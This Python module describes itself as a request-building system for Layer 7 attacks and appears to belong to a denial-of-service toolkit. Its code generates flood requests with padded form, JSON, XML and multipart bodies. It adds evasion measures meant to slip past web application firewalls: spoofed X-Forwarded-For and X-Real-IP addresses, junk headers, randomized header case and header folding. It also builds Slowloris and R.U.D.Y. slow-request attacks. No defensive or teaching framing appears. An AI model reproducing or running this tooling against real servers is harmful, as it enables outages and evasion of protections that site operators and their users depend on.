"""
Advanced Request Building System for Layer 7 Attacks
"""

import random
import string
import time
import json
import base64
import gzip
from typing import Dict, List, Optional, Any, Tuple
from urllib.parse import urlencode, quote, urlparse
from dataclasses import dataclass, field

from core.utils import CryptoUtils, get_timestamp


@dataclass
class RequestConfig:
    """Configuration for request building"""
    method: str = 'GET'
    path: str = '/'
    protocol: str = 'HTTP/1.1'
    headers: Dict[str, str] = field(default_factory=dict)
    body: Optional[str] = None
    params: Dict[str, str] = field(default_factory=dict)
    cookies: Dict[str, str] = field(default_factory=dict)
    auth: Optional[Tuple[str, str]] = None
    
    # Advanced options
    compress: bool = False
    chunked: bool = False
    keep_alive: bool = True
    follow_redirects: bool = False
    
    # Evasion options
    randomize_case: bool = False
    add_junk_headers: bool = False
    fragment_headers: bool = False


class HeaderGenerator:
    """Generate realistic and evasive HTTP headers"""
    
    def __init__(self):
        self.user_agents = [
            # Chrome
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            
            # Firefox
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0',
            
            # Safari
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
            
            # Edge
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0'
        ]
        
        self.accept_headers = [
            'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'application/json,text/plain,*/*',
            'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'
        ]
        
        self.accept_language = [
            'en-US,en;q=0.9',
            'en-GB,en;q=0.9',
            'en-US,en;q=0.5',
            'fr-FR,fr;q=0.9,en;q=0.8',
            'de-DE,de;q=0.9,en;q=0.8',
            'es-ES,es;q=0.9,en;q=0.8'
        ]
        
        self.accept_encoding = [
            'gzip, deflate, br',
            'gzip, deflate',
            'identity',
            'gzip, deflate, br, zstd'
        ]
        
        # Junk headers for evasion
        self.junk_headers = [
            'X-Forwarded-For',
            'X-Real-IP',
            'X-Originating-IP',
            'X-Remote-IP',
            'X-Client-IP',
            'X-Cluster-Client-IP',
            'X-Forwarded-Host',
            'X-Forwarded-Proto',
            'X-Requested-With',
            'X-Custom-Header',
            'X-Debug-Mode',
            'X-Test-Header'
        ]
    
    def generate_basic_headers(self, target_host: str) -> Dict[str, str]:
        """Generate basic realistic headers"""
        headers = {
            'User-Agent': random.choice(self.user_agents),
            'Accept': random.choice(self.accept_headers),
            'Accept-Language': random.choice(self.accept_language),
            'Accept-Encoding': random.choice(self.accept_encoding),
            'Host': target_host,
            'Connection': 'keep-alive',
            'Cache-Control': 'max-age=0',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1'
        }
        
        # Add random DNT header
        if random.choice([True, False]):
            headers['DNT'] = '1'
        
        return headers
    
    def generate_evasive_headers(self, target_host: str) -> Dict[str, str]:
        """Generate headers with evasion techniques"""
        headers = self.generate_basic_headers(target_host)
        
        # Add junk headers
        for _ in range(random.randint(1, 3)):
            junk_header = random.choice(self.junk_headers)
            junk_value = self._generate_junk_value()
            headers[junk_header] = junk_value
        
        # Randomize header case
        if random.choice([True, False]):
            headers = self._randomize_header_case(headers)
        
        # Add custom headers that might confuse WAFs
        if random.choice([True, False]):
            headers['X-Forwarded-For'] = self._generate_fake_ip()
        
        if random.choice([True, False]):
            headers['X-Real-IP'] = self._generate_fake_ip()
        
        return headers
    
    def generate_mobile_headers(self, target_host: str) -> Dict[str, str]:
        """Generate mobile device headers"""
        mobile_agents = [
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (Linux; Android 14; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
            'Mozilla/5.0 (iPad; CPU OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1'
        ]
        
        headers = {
            'User-Agent': random.choice(mobile_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': random.choice(self.accept_language),
            'Accept-Encoding': 'gzip, deflate',
            'Host': target_host,
            'Connection': 'keep-alive'
        }
        
        return headers
    
    def generate_api_headers(self, target_host: str) -> Dict[str, str]:
        """Generate API request headers"""
        headers = {
            'User-Agent': random.choice(self.user_agents),
            'Accept': 'application/json',
            'Content-Type': 'application/json',
            'Host': target_host,
            'Connection': 'keep-alive'
        }
        
        # Add API-specific headers
        if random.choice([True, False]):
            headers['X-Requested-With'] = 'XMLHttpRequest'
        
        if random.choice([True, False]):
            headers['X-API-Key'] = self._generate_fake_api_key()
        
        return headers
    
    def _generate_junk_value(self) -> str:
        """Generate junk header value"""
        generators = [
            lambda: ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(5, 15))),
            lambda: str(random.randint(1, 999999)),
            lambda: f"v{random.randint(1, 9)}.{random.randint(0, 9)}.{random.randint(0, 9)}",
            lambda: random.choice(['true', 'false', 'enabled', 'disabled', 'on', 'off']),
            self._generate_fake_ip
        ]
        
        return random.choice(generators)()
    
    def _generate_fake_ip(self) -> str:
        """Generate fake IP address"""
        return f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
    
    def _generate_fake_api_key(self) -> str:
        """Generate fake API key"""
        return ''.join(random.choices(string.ascii_letters + string.digits, k=32))
    
    def _randomize_header_case(self, headers: Dict[str, str]) -> Dict[str, str]:
        """Randomize header name case"""
        new_headers = {}
        
        for key, value in headers.items():
            # Randomly capitalize parts of header name
            parts = key.split('-')
            new_parts = []
            
            for part in parts:
                if random.choice([True, False]):
                    new_parts.append(part.upper())
                elif random.choice([True, False]):
                    new_parts.append(part.lower())
                else:
                    new_parts.append(part.capitalize())
            
            new_key = '-'.join(new_parts)
            new_headers[new_key] = value
        
        return new_headers


class PayloadGenerator:
    """Generate various payloads for different attack types"""
    
    def __init__(self):
        self.form_fields = [
            'username', 'password', 'email', 'name', 'firstname', 'lastname',
            'address', 'phone', 'message', 'comment', 'search', 'query',
            'id', 'token', 'csrf_token', 'action', 'submit', 'data'
        ]
        
        self.json_keys = [
            'id', 'name', 'value', 'data', 'payload', 'content', 'message',
            'user', 'token', 'session', 'timestamp', 'action', 'type'
        ]
    
    def generate_form_data(self, size: int = None) -> str:
        """Generate form-encoded data"""
        if size is None:
            size = random.randint(100, 1000)
        
        data = {}
        
        # Add random form fields
        num_fields = random.randint(3, 8)
        for _ in range(num_fields):
            field = random.choice(self.form_fields)
            value = self._generate_random_string(random.randint(5, 50))
            data[field] = value
        
        # Pad to desired size
        encoded = urlencode(data)
        if len(encoded) < size:
            padding_size = size - len(encoded) - 10  # Leave some room
            if padding_size > 0:
                data['padding'] = 'x' * padding_size
        
        return urlencode(data)
    
    def generate_json_data(self, size: int = None) -> str:
        """Generate JSON data"""
        if size is None:
            size = random.randint(100, 1000)
        
        data = {}
        
        # Add random JSON fields
        num_fields = random.randint(3, 8)
        for _ in range(num_fields):
            key = random.choice(self.json_keys)
            value_type = random.choice(['string', 'number', 'boolean', 'array'])
            
            if value_type == 'string':
                data[key] = self._generate_random_string(random.randint(5, 50))
            elif value_type == 'number':
                data[key] = random.randint(1, 999999)
            elif value_type == 'boolean':
                data[key] = random.choice([True, False])
            elif value_type == 'array':
                data[key] = [self._generate_random_string(10) for _ in range(random.randint(1, 5))]
        
        # Pad to desired size
        json_str = json.dumps(data)
        if len(json_str) < size:
            padding_size = size - len(json_str) - 20  # Leave room for JSON structure
            if padding_size > 0:
                data['padding'] = 'x' * padding_size
        
        return json.dumps(data)
    
    def generate_xml_data(self, size: int = None) -> str:
        """Generate XML data"""
        if size is None:
            size = random.randint(100, 1000)
        
        root_element = random.choice(['data', 'request', 'payload', 'message'])
        xml_content = f'<?xml version="1.0" encoding="UTF-8"?>\n<{root_element}>\n'
        
        # Add random XML elements
        num_elements = random.randint(3, 8)
        for _ in range(num_elements):
            element_name = random.choice(self.json_keys)
            element_value = self._generate_random_string(random.randint(10, 100))
            xml_content += f'  <{element_name}>{element_value}</{element_name}>\n'
        
        xml_content += f'</{root_element}>'
        
        # Pad to desired size
        if len(xml_content) < size:
            padding_size = size - len(xml_content) - 50
            if padding_size > 0:
                padding_element = 'x' * padding_size
                xml_content = xml_content.replace(f'</{root_element}>', 
                                                f'  <padding>{padding_element}</padding>\n</{root_element}>')
        
        return xml_content
    
    def generate_multipart_data(self, size: int = None) -> Tuple[str, str]:
        """Generate multipart form data"""
        if size is None:
            size = random.randint(500, 2000)
        
        boundary = '----WebKitFormBoundary' + ''.join(random.choices(string.ascii_letters + string.digits, k=16))
        
        content = ''
        
        # Add random form fields
        num_fields = random.randint(2, 5)
        for _ in range(num_fields):
            field_name = random.choice(self.form_fields)
            field_value = self._generate_random_string(random.randint(10, 100))
            
            content += f'--{boundary}\r\n'
            content += f'Content-Disposition: form-data; name="{field_name}"\r\n\r\n'
            content += f'{field_value}\r\n'
        
        # Add file upload field
        filename = f"file_{random.randint(1, 999)}.txt"
        file_content = self._generate_random_string(random.randint(100, 500))
        
        content += f'--{boundary}\r\n'
        content += f'Content-Disposition: form-data; name="file"; filename="{filename}"\r\n'
        content += f'Content-Type: text/plain\r\n\r\n'
        content += f'{file_content}\r\n'
        
        # Pad to desired size
        if len(content) < size:
            padding_size = size - len(content) - 100
            if padding_size > 0:
                padding_content = 'x' * padding_size
                content += f'--{boundary}\r\n'
                content += f'Content-Disposition: form-data; name="padding"\r\n\r\n'
                content += f'{padding_content}\r\n'
        
        content += f'--{boundary}--\r\n'
        
        content_type = f'multipart/form-data; boundary={boundary}'
        
        return content, content_type
    
    def generate_binary_data(self, size: int) -> bytes:
        """Generate binary data"""
        return bytes([random.randint(0, 255) for _ in range(size)])
    
    def generate_slow_data(self, total_size: int, chunk_size: int = 1) -> List[bytes]:
        """Generate data for slow attacks (chunked)"""
        chunks = []
        remaining = total_size
        
        while remaining > 0:
            current_chunk_size = min(chunk_size, remaining)
            chunk = self._generate_random_string(current_chunk_size).encode()
            chunks.append(chunk)
            remaining -= current_chunk_size
        
        return chunks
    
    def _generate_random_string(self, length: int) -> str:
        """Generate random string"""
        chars = string.ascii_letters + string.digits + ' .,!?-_'
        return ''.join(random.choices(chars, k=length))


class RequestBuilder:
    """Build HTTP requests with advanced features"""
    
    def __init__(self):
        self.header_generator = HeaderGenerator()
        self.payload_generator = PayloadGenerator()
    
    def build_request(self, config: RequestConfig, target_url: str) -> str:
        """Build complete HTTP request"""
        parsed_url = urlparse(target_url)
        
        # Build request line
        method = config.method.upper()
        path = config.path or parsed_url.path or '/'
        
        # Add query parameters
        if config.params:
            query_string = urlencode(config.params)
            if '?' in path:
                path += '&' + query_string
            else:
                path += '?' + query_string
        
        request_line = f"{method} {path} {config.protocol}\r\n"
        
        # Build headers
        headers = config.headers.copy()
        
        # Ensure Host header
        if 'Host' not in headers and 'host' not in headers:
            headers['Host'] = parsed_url.netloc
        
        # Add Content-Length for body requests
        if config.body and method in ['POST', 'PUT', 'PATCH']:
            if 'Content-Length' not in headers:
                headers['Content-Length'] = str(len(config.body))
        
        # Add cookies
        if config.cookies:
            cookie_string = '; '.join([f"{k}={v}" for k, v in config.cookies.items()])
            headers['Cookie'] = cookie_string
        
        # Add authentication
        if config.auth:
            username, password = config.auth
            auth_string = base64.b64encode(f"{username}:{password}".encode()).decode()
            headers['Authorization'] = f"Basic {auth_string}"
        
        # Connection handling
        if config.keep_alive:
            headers['Connection'] = 'keep-alive'
        else:
            headers['Connection'] = 'close'
        
        # Apply evasion techniques
        if config.randomize_case:
            headers = self._randomize_header_case(headers)
        
        if config.add_junk_headers:
            headers.update(self._generate_junk_headers())
        
        # Build header string
        header_string = ""
        for key, value in headers.items():
            if config.fragment_headers and random.choice([True, False]):
                # Fragment header across multiple lines (HTTP header folding)
                header_string += f"{key}:\r\n {value}\r\n"
            else:
                header_string += f"{key}: {value}\r\n"
        
        # Build complete request
        request = request_line + header_string + "\r\n"
        
        if config.body:
            if config.compress:
                body = gzip.compress(config.body.encode())
                request = request.encode() + body
            else:
                request += config.body
        
        return request
    
    def build_get_request(self, target_url: str, evasive: bool = False) -> str:
        """Build GET request"""
        parsed_url = urlparse(target_url)
        
        config = RequestConfig(
            method='GET',
            path=parsed_url.path or '/',
            headers=self.header_generator.generate_evasive_headers(parsed_url.netloc) if evasive 
                   else self.header_generator.generate_basic_headers(parsed_url.netloc)
        )
        
        if evasive:
            config.randomize_case = True
            config.add_junk_headers = True
        
        return self.build_request(config, target_url)
    
    def build_post_request(self, target_url: str, data_type: str = 'form', 
                          data_size: int = None, evasive: bool = False) -> str:
        """Build POST request with payload"""
        parsed_url = urlparse(target_url)
        
        # Generate payload based on type
        if data_type == 'form':
            body = self.payload_generator.generate_form_data(data_size)
            content_type = 'application/x-www-form-urlencoded'
        elif data_type == 'json':
            body = self.payload_generator.generate_json_data(data_size)
            content_type = 'application/json'
        elif data_type == 'xml':
            body = self.payload_generator.generate_xml_data(data_size)
            content_type = 'application/xml'
        elif data_type == 'multipart':
            body, content_type = self.payload_generator.generate_multipart_data(data_size)
        else:
            body = self.payload_generator.generate_form_data(data_size)
            content_type = 'application/x-www-form-urlencoded'
        
        # Generate headers
        if evasive:
            headers = self.header_generator.generate_evasive_headers(parsed_url.netloc)
        else:
            headers = self.header_generator.generate_basic_headers(parsed_url.netloc)
        
        headers['Content-Type'] = content_type
        
        config = RequestConfig(
            method='POST',
            path=parsed_url.path or '/',
            headers=headers,
            body=body
        )
        
        if evasive:
            config.randomize_case = True
            config.add_junk_headers = True
        
        return self.build_request(config, target_url)
    
    def build_slow_request(self, target_url: str, attack_type: str = 'slowloris') -> str:
        """Build request for slow attacks"""
        parsed_url = urlparse(target_url)
        
        if attack_type == 'slowloris':
            # Slowloris - incomplete headers
            headers = self.header_generator.generate_basic_headers(parsed_url.netloc)
            
            config = RequestConfig(
                method='GET',
                path=parsed_url.path or '/',
                headers=headers,
                keep_alive=True
            )
            
            # Build partial request (missing final \r\n)
            request = self.build_request(config, target_url)
            if request.endswith('\r\n\r\n'):
                request = request[:-2]  # Remove final \r\n
            
            return request
            
        elif attack_type == 'rudy':
            # R.U.D.Y - slow POST
            headers = self.header_generator.generate_basic_headers(parsed_url.netloc)
            headers['Content-Type'] = 'application/x-www-form-urlencoded'
            headers['Content-Length'] = '1000000'  # Large content length
            
            config = RequestConfig(
                method='POST',
                path=parsed_url.path or '/',
                headers=headers,
                body='',  # Will be sent slowly
                keep_alive=True
            )
            
            return self.build_request(config, target_url)
    
    def build_websocket_upgrade(self, target_url: str) -> str:
        """Build WebSocket upgrade request"""
        parsed_url = urlparse(target_url)
        
        # Generate WebSocket key
        ws_key = base64.b64encode(CryptoUtils.generate_random_bytes(16)).decode()
        
        headers = {
            'Host': parsed_url.netloc,
            'Upgrade': 'websocket',
            'Connection': 'Upgrade',
            'Sec-WebSocket-Key': ws_key,
            'Sec-WebSocket-Version': '13',
            'User-Agent': random.choice(self.header_generator.user_agents)
        }
        
        config = RequestConfig(
            method='GET',
            path=parsed_url.path or '/',
            headers=headers
        )
        
        return self.build_request(config, target_url)
    
    def _randomize_header_case(self, headers: Dict[str, str]) -> Dict[str, str]:
        """Randomize header case for evasion"""
        return self.header_generator._randomize_header_case(headers)
    
    def _generate_junk_headers(self) -> Dict[str, str]:
        """Generate junk headers for evasion"""
        junk_headers = {}
        
        for _ in range(random.randint(1, 3)):
            header_name = f"X-{random.choice(['Custom', 'Debug', 'Test', 'Client'])}-{random.randint(1, 999)}"
            header_value = ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(5, 20)))
            junk_headers[header_name] = header_value
        
        return junk_headers